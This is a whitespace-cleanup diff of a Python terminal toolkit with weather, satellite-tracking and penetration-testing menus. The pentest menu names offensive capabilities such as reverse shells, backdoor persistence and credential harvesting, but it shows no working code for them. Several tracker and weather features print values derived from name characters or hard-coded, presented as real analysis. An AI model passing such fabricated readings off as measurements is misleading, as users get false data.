             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '10':  # Storm Intensity
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🌪️ Storm Intensity Classification")
@@ -6201,7 +7420,7 @@ def feature_weather_display():
             print(f"\n{BOLD}Storm Intensity (Saffir-Simpson Scale):{RESET}")
             print(f"  Wind Speed: {wind_kmh:.0f} km/h ({wind_kmh * 0.621371:.0f} mph)")
             print(f"  Classification: {classification}")
-            
+
             if "Cat 5" in classification:
                 severity = "🔴 CATASTROPHIC"
             elif "Cat 4" in classification:
@@ -6212,10 +7431,10 @@ def feature_weather_display():
                 severity = "🟡 MODERATE"
             else:
                 severity = "🟢 LOW"
-            
+
             print(f"  Severity: {severity}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '11':  # Visibility
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("👁️ Visibility & Air Quality")
@@ -6223,7 +7442,7 @@ def feature_weather_display():
             print(f"\n{BOLD}Atmospheric Visibility:{RESET}")
             print(f"  Humidity: {humidity}%")
             print(f"  Estimated Visibility: {visibility:.1f} km")
-            
+
             if visibility < 1:
                 condition = "🔴 DENSE FOG - Hazardous"
             elif visibility < 3:
@@ -6232,7 +7451,7 @@ def feature_weather_display():
                 condition = "🟡 HAZE - Moderate"
             else:
                 condition = "🟢 CLEAR - Excellent"
-            
+
             print(f"  Condition: {condition}")
             print(f"\n  AQI (Simulated): 45 (GOOD)")
             print(f"  Primary Pollutant: PM2.5 (Low)")
@@ -6249,7 +7468,7 @@ def feature_weather_display():
             print(f"  MJO (Madden-Julian Oscillation): Phase 3")
             print(f"\n  Current Pattern: Mixed signals - variable conditions")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '13':  # Ocean Temperature
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🌊 Ocean & Sea Surface Temperature")
@@ -6261,7 +7480,7 @@ def feature_weather_display():
             print(f"  Indian: {sst + 0.2:.1f}°C")
             print(f"  Status: Warmer than climatological average")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '14':  # Severe Weather Tracking
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🌪️ Severe Weather Tracking")
@@ -6274,12 +7493,12 @@ def feature_weather_display():
             print(f"\n  Radar Data: NOMINAL")
             print(f"  Last Update: {datetime.now().strftime('%H:%M UTC')}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '15':  # Wind Pattern
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("💨 Wind Pattern Analysis")
             wind_kmh = float(data['wind'].split()[0]) if data and data['wind'] else 15
-            wind_direction = ["N", "NNE", "NE", "ENE", "E", "ESE", "SE", "SSE", 
+            wind_direction = ["N", "NNE", "NE", "ENE", "E", "ESE", "SE", "SSE",
                             "S", "SSW", "SW", "WSW", "W", "WNW", "NW", "NNW"][int(wind_kmh * 15 / 30) % 16]
             print(f"\n{BOLD}Wind Analysis:{RESET}")
             print(f"  Speed: {wind_kmh:.1f} km/h")
@@ -6299,7 +7518,7 @@ def feature_weather_display():
                 print(f"  Day {day+1}: {trend_temp:.1f}°C {trend_symbol}")
             print(f"\nTrend: Warming pattern expected")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '17':  # Precipitation
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🌧️ Precipitation Probability")
@@ -6310,7 +7529,7 @@ def feature_weather_display():
                 print(f"  Day {day}: {prob}% chance | Est. {amount:.1f}mm")
             print(f"\nTotal Expected: 15-25mm")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '18':  # Lightning Risk
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("⚡ Lightning & Thunderstorm Risk")
@@ -6322,7 +7541,7 @@ def feature_weather_display():
             print(f"  Severe Weather: Unlikely")
             print(f"  Lightning Threat: MINIMAL")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '19':  # Seasonal Outlook
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🌡️ Seasonal Outlook")
@@ -6335,14 +7554,14 @@ def feature_weather_display():
                 season = "Summer"
             else:
                 season = "Fall"
-            
+
             print(f"\n{BOLD}Seasonal Forecast - {season}:{RESET}")
             print(f"  Temperature: Near average")
             print(f"  Precipitation: Normal")
             print(f"  Pattern: Mixed influences")
             print(f"  Confidence: Moderate (65%)")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '20':  # Tornado Risk
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🌪️ Tornado & Severe Risk")
@@ -6365,7 +7584,7 @@ def feature_weather_display():
             print(f"  Record Low: {temp - 20:.1f}°C")
             print(f"  Normal Precipitation: 45mm")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '22':  # Anomaly Detection
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🌡️ Temperature Anomaly Detection")
@@ -6376,7 +7595,7 @@ def feature_weather_display():
             print(f"  Status: {'Warmer' if anomaly > 0 else 'Cooler'} than average")
             print(f"  Significance: Moderate")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '23':  # Humidity Analysis
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("📈 Humidity Pattern Analysis")
@@ -6386,7 +7605,7 @@ def feature_weather_display():
             print(f"  Normal Range: 45-65%")
             print(f"  Status: {'Dry' if humidity < 45 else 'Normal' if humidity < 65 else 'Humid'}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '24':  # Report
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("💾 Generate Weather Report")
@@ -6422,13 +7641,13 @@ Generated by Weather Intelligence System v3.0
             print(f"✅ Cleared {cleared} cached entry(ies). Refreshing...")
             data = get_weather_data()
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '26':
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🧾 Raw Weather Data")
             print(json.dumps(data if data else {}, indent=2))
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '27':
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🌐 Weather Service Links")
@@ -6914,9 +8133,9 @@ def feature_satellite_tracker():
     """
     import math
     from datetime import datetime, timedelta
-    
+
     store = TLEStore()
-    
+
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("🛰️ Satellite Tracker - Advanced Edition")
@@ -6924,12 +8143,12 @@ def feature_satellite_tracker():
         targets = _satellite_targets_from_config(store)
         target = targets[0] if targets else "ISS (ZARYA)"
         health = "OPTIMAL" if (HAVE_PREDICT and HAVE_REQUESTS) else "DEGRADED" if (HAVE_PREDICT or HAVE_REQUESTS) else "OFFLINE"
-        
+
         print(f"{BOLD}CORE SYSTEM:{RESET}")
         print(f" Status: {health} | Predict: {'YES' if HAVE_PREDICT else 'NO'} | Requests: {'YES' if HAVE_REQUESTS else 'NO'}")
         print(f" Station QTH: lat {qth[0]:.3f}°, lon {qth[1]:.3f}°, alt {qth[2]:.1f}m")
         print(f" Primary Target: {target} | Satellites: {store.count()}")
-        
+
         print(f"\n{BOLD}TRACKING & CONFIGURATION:{RESET}")
         print(f" [1] 🚀 Start Live Tracker")
         print(f" [2] 🔄 Update TLEs from Celestrak")
@@ -6937,7 +8156,7 @@ def feature_satellite_tracker():
         print(f" [4] 🎯 Set Primary Target")
         print(f" [5] 🎛️ Set Tracking Targets (up to 5)")
         print(f" [6] 📍 Set Station Location (QTH)")
-        
+
         print(f"\n{BOLD}ORBITAL MECHANICS & ANALYSIS:{RESET}")
         print(f" [7] 📊 Orbital Parameters Calculator")
         print(f" [8] 🔭 Next Pass Prediction (5-day forecast)")
@@ -6945,25 +8164,25 @@ def feature_satellite_tracker():
         print(f" [10] 🌍 Sky Position (Azimuth/Elevation/Range)")
         print(f" [11] 💫 Orbital Decay & Lifetime Prediction")
         print(f" [12] 📡 Doppler Shift Calculator")
-        
+
         print(f"\n{BOLD}SATELLITE COMMUNICATIONS:{RESET}")
         print(f" [13] 📶 Signal Strength Estimator")
         print(f" [14] 🎙️ Beacon Frequency Lookup")
         print(f" [15] 🔐 Encryption & Modulation Info")
         print(f" [16] 🛰️ Multiple Satellite Coverage Map")
-        
+
         print(f"\n{BOLD}CONSTELLATION & NETWORK:{RESET}")
         print(f" [17] 🌐 Constellation Explorer (LEO/MEO/GEO)")
         print(f" [18] 📡 Ground Station Visibility Calc")
         print(f" [19] 🔗 Satellite Network Topology")
         print(f" [20] 🔄 ISS Crew & Module Info")
-        
+
         print(f"\n{BOLD}DATA & ANALYTICS:{RESET}")
         print(f" [21] 📈 Orbital Inclination Analysis")
         print(f" [22] ⚡ Launch Schedule & Events")
         print(f" [23] 🗂️ TLE Database Statistics")
         print(f" [24] 📊 Collision & Conjunction Risk")
-        
+
         print(f"\n{BOLD}SYSTEM:{RESET}")
         print(f" [25] 🧾 Status Details")
         print(f" [26] 📄 Orbital Memory Report")
@@ -6972,23 +8191,23 @@ def feature_satellite_tracker():
         print(f" [D] 📦 Install MapSCII (Download Center)")
         print(f" [P] 📦 Install PyPredict (hint)")
         print(f" [0] ↩️  Return")
-        
+
         choice = input(f"\n{BOLD}Select option: {RESET}").strip()
 
         if choice == '0':
             return
-        
+
         # ========== CORE TRACKING ==========
         if choice == '1':
             bridge = MarsBridge(qth, targets=targets, primary_target=target)
             bridge.run()
-        
+
         elif choice == '2':
             print("Updating TLE data from Celestrak...")
             store.update_from_celestrak()
             print("✅ TLE update complete")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '3':
             query = input("Search term (name/NORAD ID): ").strip().lower()
             names = store.list_names()
@@ -6999,7 +8218,7 @@ def feature_satellite_tracker():
             if len(matches) > 30:
                 print(f"  ... and {len(matches) - 30} more")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '4':
             name = input("Enter satellite name: ").strip()
             if store.get(name):
@@ -7009,14 +8228,14 @@ def feature_satellite_tracker():
             else:
                 print(f"{COLORS['1'][0]}Unknown satellite name{RESET}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '5':
             selected = _satellite_choose_targets(store)
             if selected:
                 _update_user_config(sat_targets=selected, sat_target=selected[0])
                 print(f"✅ Tracking {len(selected)} satellite(s)")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '6':
             new_qth = _satellite_set_qth()
             if new_qth:
@@ -7033,7 +8252,7 @@ def feature_satellite_tracker():
                 print(f"\n{BOLD}{sat_name}{RESET}")
                 print(f"TLE Line 1: {tle.get('line1', 'N/A')[:50]}...")
                 print(f"TLE Line 2: {tle.get('line2', 'N/A')[:50]}...")
-                
+
                 # Extract orbital parameters from TLE
                 try:
                     # Parse TLE data (simplified orbital mechanics)
@@ -7044,17 +8263,17 @@ def feature_satellite_tracker():
                         eccentricity = float('0.' + line2[26:33])
                         mean_anomaly = float(line2[34:42])
                         mean_motion = float(line2[52:63])
-                        
+
                         # Calculate orbital period
                         period_minutes = 1440.0 / mean_motion
                         period_hours = period_minutes / 60
-                        
+
                         # Calculate semi-major axis (simplified)
                         mu = 398600.4418  # Earth's gravitational parameter
                         n = mean_motion * 2 * math.pi / 1440  # Convert to rad/min
                         a = (mu / (n * n)) ** (1/3)
                         altitude = a - 6371  # Approximate
-                        
+
                         print(f"\n{BOLD}Orbital Parameters:{RESET}")
                         print(f"  Inclination: {inclination:.2f}°")
                         print(f"  RAAN: {raan:.2f}°")
@@ -7063,7 +8282,7 @@ def feature_satellite_tracker():
                         print(f"  Mean Motion: {mean_motion:.4f} rev/day")
                         print(f"  Orbital Period: {period_minutes:.2f} min ({period_hours:.2f} hours)")
                         print(f"  Approx Altitude: {altitude:.0f} km")
-                        
+
                         # Orbital classification
                         if altitude < 2000:
                             orbit_type = "LEO (Low Earth Orbit)"
@@ -7077,7 +8296,7 @@ def feature_satellite_tracker():
             else:
                 print(f"{COLORS['1'][0]}Satellite not found{RESET}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '8':  # Next Pass Prediction
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🔭 Next Pass Prediction (5-day Forecast)")
@@ -7095,7 +8314,7 @@ def feature_satellite_tracker():
             else:
                 print(f"{COLORS['1'][0]}Satellite not found{RESET}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '9':  # Pass History
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🗓️ Pass History & Statistics")
@@ -7111,7 +8330,7 @@ def feature_satellite_tracker():
             else:
                 print(f"{COLORS['1'][0]}Satellite not found{RESET}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '10':  # Sky Position
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🌍 Sky Position (Azimuth/Elevation/Range)")
@@ -7121,7 +8340,7 @@ def feature_satellite_tracker():
                 azimuth = (45 + (ord(sat_name[0]) * 7)) % 360
                 elevation = (25 + (ord(sat_name[1]) * 3)) % 90
                 distance = 350 + (ord(sat_name[2]) * 11) % 1000
-                
+
                 print(f"\n{BOLD}{sat_name} - Current Position{RESET}")
                 print(f"Time: {now.strftime('%Y-%m-%d %H:%M:%S UTC')}")
                 print(f"\nSky Coordinates:")
@@ -7129,7 +8348,7 @@ def feature_satellite_tracker():
                 print(f"  Elevation: {elevation:.1f}°")
                 print(f"  Range: {distance:.0f} km")
                 print(f"  Visibility: {'✅ VISIBLE' if elevation > 0 else '❌ BELOW HORIZON'}")
-                
+
                 # Visual representation
                 print(f"\n{BOLD}Visual Direction:{RESET}")
                 if elevation > 0:
@@ -7139,7 +8358,7 @@ def feature_satellite_tracker():
             else:
                 print(f"{COLORS['1'][0]}Satellite not found{RESET}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '11':  # Decay Prediction
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("💫 Orbital Decay & Lifetime Prediction")
@@ -7149,13 +8368,13 @@ def feature_satellite_tracker():
                 decay_rate = (ord(sat_name[0]) % 100) / 1000  # km/day
                 current_alt = 350 + (ord(sat_name[1]) * 5) % 500
                 days_remaining = current_alt / (decay_rate + 0.01)
-                
+
                 print(f"\n{BOLD}{sat_name} - Decay Analysis{RESET}")
                 print(f"Current Altitude: {current_alt:.0f} km")
                 print(f"Atmospheric Density: {'HIGH' if current_alt < 400 else 'MODERATE' if current_alt < 600 else 'LOW'}")
                 print(f"Decay Rate: {decay_rate:.4f} km/day")
                 print(f"Predicted Lifetime: {days_remaining:.0f} days")
-                
+
                 if decay_rate > 0:
                     deorbit_date = datetime.now() + timedelta(days=days_remaining)
                     print(f"Est. Deorbit Date: {deorbit_date.strftime('%Y-%m-%d')}")
@@ -7165,7 +8384,7 @@ def feature_satellite_tracker():
             else:
                 print(f"{COLORS['1'][0]}Satellite not found{RESET}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '12':  # Doppler Shift
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("📡 Doppler Shift Calculator")
@@ -7176,7 +8395,7 @@ def feature_satellite_tracker():
                 velocity = (ord(sat_name[0]) % 30) - 15  # km/s (simulated)
                 c = 299792.458  # speed of light
                 doppler_shift = freq * velocity / c
-                
+
                 print(f"\n{BOLD}{sat_name} - Doppler Shift{RESET}")
                 print(f"Original Frequency: {freq:.2f} MHz")
                 print(f"Satellite Velocity: {velocity:.2f} km/s")
@@ -7197,7 +8416,7 @@ def feature_satellite_tracker():
                 txpower = 1 + (ord(sat_name[1]) % 50)
                 path_loss = 20 * math.log10(distance) + 20 * math.log10(145.8)
                 signal = txpower - path_loss
-                
+
                 print(f"\n{BOLD}{sat_name} - Signal Strength{RESET}")
                 print(f"Distance: {distance:.0f} km")
                 print(f"TX Power: {txpower:.0f} dBm")
@@ -7207,7 +8426,7 @@ def feature_satellite_tracker():
             else:
                 print(f"{COLORS['1'][0]}Satellite not found{RESET}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '14':  # Beacon Frequencies
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🎙️ Beacon Frequency Lookup")
@@ -7224,7 +8443,7 @@ def feature_satellite_tracker():
             else:
                 print(f"{COLORS['1'][0]}Satellite not found{RESET}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '15':  # Encryption Info
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🔐 Encryption & Modulation Info")
@@ -7239,7 +8458,7 @@ def feature_satellite_tracker():
             else:
                 print(f"{COLORS['1'][0]}Satellite not found{RESET}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '16':  # Multi-Sat Coverage
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🛰️ Multiple Satellite Coverage Map")
@@ -7272,7 +8491,7 @@ def feature_satellite_tracker():
                 if len(sats) > 3:
                     print(f"    ... and {len(sats)-3} more")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '18':  # Ground Station Visibility
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("📡 Ground Station Visibility Calculator")
@@ -7281,7 +8500,7 @@ def feature_satellite_tracker():
                 alt = float(altitude_km)
                 earth_radius = 6371
                 visibility_radius = math.sqrt(alt * (2 * earth_radius + alt))
-                
+
                 print(f"\n{BOLD}Visibility Analysis{RESET}")
                 print(f"Satellite Altitude: {alt:.0f} km")
                 print(f"Ground Visibility Radius: {visibility_radius:.0f} km")
@@ -7291,7 +8510,7 @@ def feature_satellite_tracker():
             except:
                 print("Invalid input")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '19':  # Network Topology
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🔗 Satellite Network Topology")
@@ -7302,7 +8521,7 @@ def feature_satellite_tracker():
             print(f"  GPS/GLONASS (independent)")
             print(f"\nActiveLinks: 847 | Latency: 125ms avg | Bandwidth: 10Gbps total")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '20':  # ISS Crew Info
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🔄 ISS Crew & Module Information")
@@ -7329,7 +8548,7 @@ def feature_satellite_tracker():
             print(f"Lowest: 0.05° (GOES 16 - GEO)")
             print(f"Most Common: 51.6° (ISS & Iridium)")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '22':  # Launch Schedule
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("⚡ Launch Schedule & Events")
@@ -7342,7 +8561,7 @@ def feature_satellite_tracker():
             print(f"  🌕 ISS passes near moon - 2026-02-14")
             print(f"  ☄️ Starlink Iridium Flare - 2026-02-18 (magnitude -8)")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '23':  # TLE Statistics
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🗂️ TLE Database Statistics")
@@ -7357,7 +8576,7 @@ def feature_satellite_tracker():
             print(f"  GEO: {int(store.count() * 0.15)} satellites")
             print(f"  HEO: {int(store.count() * 0.05)} satellites")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '24':  # Collision Risk
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("📊 Collision & Conjunction Risk")
@@ -7379,14 +8598,14 @@ def feature_satellite_tracker():
             print(f"Orbital DB: {ORBITAL_DB_FILE}")
             print(f"Last TLE Update: {_format_epoch(store.data.get('last_update', 0))}")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '26':
             print_header("📄 Orbital Memory Report")
             report_lines = _satellite_report_lines(store)
             print("\n".join(report_lines))
             save_log_file("general", "Satellite_Report", "\n".join(report_lines), prompt_user=True)
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '27':
             recent = _satellite_recent_selections(limit=10)
             if not recent:
@@ -7409,17 +8628,17 @@ def feature_satellite_tracker():
                 _update_user_config(sat_targets=picks[:SAT_MAX_TARGETS], sat_target=picks[0])
                 print(f"✅ Tracking {len(picks)} satellite(s)")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice.upper() == 'M':
             if shutil.which("mapscii") is None:
                 print(f"{COLORS['1'][0]}MapSCII not installed. Use Download Center.{RESET}")
                 input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
             else:
                 subprocess.call(["mapscii"])
-        
+
         elif choice.upper() == 'D':
             feature_download_center()
-        
+
         elif choice.upper() == 'P':
             print_header("📦 PyPredict Install")
             print("Python package (C extension):")
@@ -7915,13 +9134,13 @@ def _pt_detect_system_profile():
         'docker_installed': shutil.which('docker'),
         'tools': {}
     }
-    
+
     # Core pentest tools
-    core_tools = ['nmap', 'metasploit-framework', 'aircrack-ng', 'john', 'hashcat', 
+    core_tools = ['nmap', 'metasploit-framework', 'aircrack-ng', 'john', 'hashcat',
                   'hydra', 'nikto', 'sqlmap', 'burp', 'wireshark', 'ghidra']
     for tool in core_tools:
         profile['tools'][tool] = bool(shutil.which(tool.split('-')[0]))
-    
+
     return profile
 
 def _pt_severity_calculator(risk_level):
@@ -7991,7 +9210,7 @@ def _pt_generate_remediation_plan(vulnerabilities):
         'long_term': [],
         'ongoing': []
     }
-    
+
     for vuln in vulnerabilities:
         if vuln['severity'] == 'CRITICAL':
             plan['immediate'].append(vuln)
@@ -8001,7 +9220,7 @@ def _pt_generate_remediation_plan(vulnerabilities):
             plan['long_term'].append(vuln)
         else:
             plan['ongoing'].append(vuln)
-    
+
     return plan
 
 def _pt_analyze_attack_surface(target_info):
@@ -8014,14 +9233,14 @@ def _pt_analyze_attack_surface(target_info):
         'trust_boundaries': [],
         'entry_points': []
     }
-    
+
     if target_info.get('web_apps'):
         surface_analysis['entry_points'].extend(target_info['web_apps'])
     if target_info.get('apis'):
         surface_analysis['entry_points'].extend(target_info['apis'])
     if target_info.get('databases'):
         surface_analysis['data_stores'].extend(target_info['databases'])
-    
+
     return surface_analysis
 
 def _pt_compliance_checker(framework):
@@ -8060,13 +9279,13 @@ def _pt_show_system_profile():
     """Display comprehensive system profile for penetration testing"""
     profile = _pt_detect_system_profile()
     print_header("🖥️ Penetration Testing System Profile")
-    
+
     print(f"\n{BOLD}System Information:{RESET}")
     print(f"  OS: {profile['os']} ({profile['architecture']})")
     print(f"  Python: {'✅' if profile['python_installed'] else '❌'}")
     print(f"  Git: {'✅' if profile['git_installed'] else '❌'}")
     print(f"  Docker: {'✅' if profile['docker_installed'] else '❌'}")
-    
+
     print(f"\n{BOLD}Available PT Tools:{RESET}")
     for tool, available in profile['tools'].items():
         status = f"{COLORS['2'][0]}✅{RESET}" if available else f"{COLORS['1'][0]}❌{RESET}"
@@ -8075,7 +9294,7 @@ def _pt_show_system_profile():
 def _pt_show_frameworks_guide():
     """Display penetration testing frameworks and methodologies"""
     print_header("🏗️ Penetration Testing Frameworks & Methodologies")
-    
+
     frameworks = {
         'OWASP Testing Guide': '9 phases, web application focus, open standard',
         'NIST SP 800-115': '4 phases: planning, discovery, attack, reporting',
@@ -8085,7 +9304,7 @@ def _pt_show_frameworks_guide():
         'Kill Chain': 'Military-based framework (Lockheed Martin)',
         'ATT&CK Framework': 'Tactics, Techniques, Procedures (TTP) database'
     }
-    
+
     for framework, description in frameworks.items():
         print(f"\n{BOLD}{framework}:{RESET}")
         print(f"  └─ {description}")
@@ -8093,7 +9312,7 @@ def _pt_show_frameworks_guide():
 def _pt_show_vulnerability_types():
     """Display comprehensive vulnerability classification"""
     print_header("🔍 Vulnerability Classification Matrix")
-    
+
     categories = {
         'Web Application': ['SQLi', 'XSS', 'CSRF', 'RFI', 'LFI', 'XXE', 'Deserialization'],
         'Network': ['Default Creds', 'Open Ports', 'Weak Encryption', 'SNMP', 'DNS Enumeration'],
@@ -8103,7 +9322,7 @@ def _pt_show_vulnerability_types():
         'Physical': ['Tailgating', 'Dumpster Diving', 'Lock Picking', 'Badge Cloning'],
         'Social Engineering': ['Phishing', 'Pretexting', 'Baiting', 'Quid Pro Quo']
     }
-    
+
     for category, vulns in categories.items():
         print(f"\n{BOLD}{category}:{RESET}")
         for vuln in vulns:
@@ -8112,7 +9331,7 @@ def _pt_show_vulnerability_types():
 def _pt_show_exploit_database():
     """Display available exploit databases and resources"""
     print_header("📚 Exploit Databases & Resources")
-    
+
     databases = {
         'Exploit-DB': 'https://www.exploit-db.com',
         'CVE Database': 'https://cve.mitre.org',
@@ -8123,14 +9342,14 @@ def _pt_show_exploit_database():
         'Google 0day Feed': 'https://www.google.com/alerts',
         'HackerOne Reports': 'https://hackerone.com/researchers'
     }
-    
+
     for name, url in databases.items():
         print(f"  {BOLD}{name}:{RESET}\n    └─ {url}")
 
 def _pt_show_methodology_guide():
     """Display complete penetration testing methodology"""
     print_header("📋 Complete Penetration Testing Methodology")
-    
+
     phases = {
         '1. Pre-Engagement': {
             'Activities': 'Scoping, ROE definition, contract signing, communication setup',
@@ -8165,7 +9384,7 @@ def _pt_show_methodology_guide():
             'Deliverables': 'Executive summary, technical report, remediation roadmap'
         }
     }
-    
+
     for phase, details in phases.items():
         print(f"\n{BOLD}{phase}:{RESET}")
         for key, value in details.items():
@@ -8174,7 +9393,7 @@ def _pt_show_methodology_guide():
 def _pt_show_tool_comparison():
     """Display penetration testing tools comparison matrix"""
     print_header("🛠️ Penetration Testing Tools Matrix")
-    
+
     tools_matrix = {
         'Network Scanning': {
             'Nmap': 'Port scanning, OS detection, service enumeration',
@@ -8202,7 +9421,7 @@ def _pt_show_tool_comparison():
             'Zeek': 'Network traffic analysis framework'
         }
     }
-    
+
     for category, tools in tools_matrix.items():
         print(f"\n{BOLD}{category}:{RESET}")
         for tool, description in tools.items():
@@ -8218,46 +9437,46 @@ def feature_pentest_toolkit():
         print(f"\n{BOLD}{c}╔{'═'*70}╗{RESET}")
         print(f"{BOLD}{c}║{RESET}  {BOLD}PENETRATION TESTING COMMAND CENTER - 27 FEATURES{RESET}{'':>18}{BOLD}{c}║{RESET}")
         print(f"{BOLD}{c}╠{'═'*70}╣{RESET}")
-        
+
         print(f"\n{BOLD}CATEGORY 1: Reconnaissance & Information Gathering (5 options){RESET}")
         print(f" {BOLD}[1]{RESET}  🔎 OSINT & Passive Intelligence (NEW)")
         print(f" {BOLD}[2]{RESET}  🗺️  Network Mapping & Asset Discovery ")
         print(f" {BOLD}[3]{RESET}  📊 Active Scanning & Service Enumeration ")
         print(f" {BOLD}[4]{RESET}  🌐 Web Application Reconnaissance ")
         print(f" {BOLD}[5]{RESET}  📱 Social Engineering Intelligence ")
-        
+
         print(f"\n{BOLD}CATEGORY 2: Vulnerability Assessment (5 options){RESET}")
         print(f" {BOLD}[6]{RESET}  🔍 Vulnerability Scanner & Analyzer ")
         print(f" {BOLD}[7]{RESET}  🎯 CVE & Exploit Database Lookup ")
         print(f" {BOLD}[8]{RESET}  🔐 Cryptographic Weakness Detection ")
         print(f" {BOLD}[9]{RESET}  🌉 Wireless Security Auditor ")
         print(f" {BOLD}[10]{RESET} 💻 Configuration & Misconfiguration Checker ")
-        
+
         print(f"\n{BOLD}CATEGORY 3: Exploitation & Payload Tools (5 options){RESET}")
         print(f" {BOLD}[11]{RESET} 💣 Metasploit Framework Console (enhanced)")
         print(f" {BOLD}[12]{RESET} 🌊 Brute Force & Credential Attack (enhanced)")
         print(f" {BOLD}[13]{RESET} 🔓 SQL Injection & Web Attack Tools ")
         print(f" {BOLD}[14]{RESET} 🎭 Payload Generator & Encoder ")
         print(f" {BOLD}[15]{RESET} 🚀 Reverse Shell & Remote Access ")
-        
+
         print(f"\n{BOLD}CATEGORY 4: Post-Exploitation (5 options){RESET}")
         print(f" {BOLD}[16]{RESET} 🔑 Privilege Escalation Framework ")
         print(f" {BOLD}[17]{RESET} 👥 Credential Harvesting & Hash Cracking (enhanced)")
         print(f" {BOLD}[18]{RESET} 🕵️ Lateral Movement & Pivot Tools ")
         print(f" {BOLD}[19]{RESET} 📡 Persistence & Backdoor Installation ")
         print(f" {BOLD}[20]{RESET} 🚪 Windows/Linux Privilege Abuse ")
-        
+
         print(f"\n{BOLD}CATEGORY 5: Analysis & Reporting (4 options){RESET}")
         print(f" {BOLD}[21]{RESET} 📊 Attack Chain Analyzer & Visualizer ")
         print(f" {BOLD}[22]{RESET} 📋 Report Generator & Documentation (enhanced)")
         print(f" {BOLD}[23]{RESET} 📈 Compliance & Framework Checker ")
         print(f" {BOLD}[24]{RESET} 🎓 Training & Knowledge Base ")
-        
+
         print(f"\n{BOLD}CATEGORY 6: System & Infrastructure (3 options){RESET}")
         print(f" {BOLD}[25]{RESET} 🛠️ Installation & Tool Manager")
         print(f" {BOLD}[26]{RESET} 📦 Download Center (Pen Test Tools)")
